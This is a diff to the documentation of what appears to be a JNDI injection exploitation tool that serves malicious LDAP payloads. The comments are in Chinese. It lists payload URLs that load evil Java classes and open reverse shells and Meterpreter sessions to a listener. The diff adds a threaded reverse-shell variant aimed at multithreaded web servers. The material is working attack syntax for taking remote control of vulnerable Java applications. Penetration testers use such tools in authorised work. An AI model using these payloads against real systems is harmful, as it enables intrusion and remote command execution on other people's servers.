@@ -103,9 +103,18 @@ ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
 ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # 相对于当前路径
 ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>
 
-# 反弹 Shell (支持 Windows)
+# 反弹 Shell (基于 Java 代码, 支持 Windows)
+
+# 在当前线程中反弹 Shell (适用于单线程应用)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
+
+# 在新线程中反弹 Shell (适用于复杂场景, 例如多线程 Web 服务器)
+ldap://127.0.0.1:1389/Basic/ReverseShell/Thread/127.0.0.1/4444
+ldap://127.0.0.1:1389/Basic/ReverseShell/Thread/MTI3LjAuMC4x/NDQ0NA==
+
+# 在复杂场景中, 如果使用 "在当前线程中反弹 Shell", 则需要使用 `exit` 命令退出 (不能使用 Ctrl-C), 否则将无法再次触发 JNDI 注入
+# 若使用 "在新线程中反弹 Shell", 则不存在这个问题
 
 # 反弹 Meterpreter (java/meterpreter/reverse_tcp)
 ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
